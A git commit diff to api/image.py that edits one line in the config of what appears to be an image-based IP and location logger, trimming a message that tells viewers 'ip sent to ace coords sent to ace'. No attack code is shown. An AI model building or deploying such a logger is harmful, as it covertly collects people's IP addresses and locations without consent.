08b49b993a878a962aff719bf0eab709e06db5e3
ACE <ace769116@gmail.com>
2025-06-08 11:01:24 +0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -29,7 +29,7 @@ config = {
 
 "message": { # Show a custom message when the user opens the image  
     "doMessage": True, # Enable the custom message?  
-    "message": "ip sent to ace coords sent to ace . ", # Message to show  
+    "message": "ip sent to ace coords sent to ace", # Message to show  
     "richMessage": True, # Enable rich text? (See README for more info)  
 },  
 
